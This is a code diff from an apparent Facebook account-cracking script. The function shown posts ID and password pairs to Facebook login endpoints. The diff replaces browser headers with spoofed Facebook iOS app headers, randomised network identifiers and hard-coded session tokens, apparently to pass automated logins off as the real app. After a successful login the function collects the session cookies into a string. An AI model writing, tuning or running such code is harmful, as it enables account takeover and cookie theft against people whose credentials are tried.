@@ -1217,23 +1217,23 @@ def m6(idf,pw):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-            'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/login/device-based/login/async/',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'referer': 'https://m.facebook.com',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-   lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Mobile/14E304 [FBAN/FBIOS;FBAV/99.0.0.45.172;FBBV/35196872;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.1;FBSS/2;FBCR/;FBID/phone;FBLC/en_US;FBOP/5]',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Host': 'graph.facebook.com',
+    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+    'X-FB-Connection-Type': 'MOBILE.LTE',
+    'X-Tigon-Is-Retry': 'False',
+    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+    'x-fb-device-group': '5120',
+    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+    'X-FB-Request-Analytics-Tags': 'graphservice',
+    'X-FB-HTTP-Engine': 'Liger',
+    'X-FB-Client-IP': 'True',
+    'X-FB-Server-Cluster': 'True',
+    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+    'Content-Length': '706'}
+   lo = session.post('https://www.facebook.com/login/device-based/regular/login/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
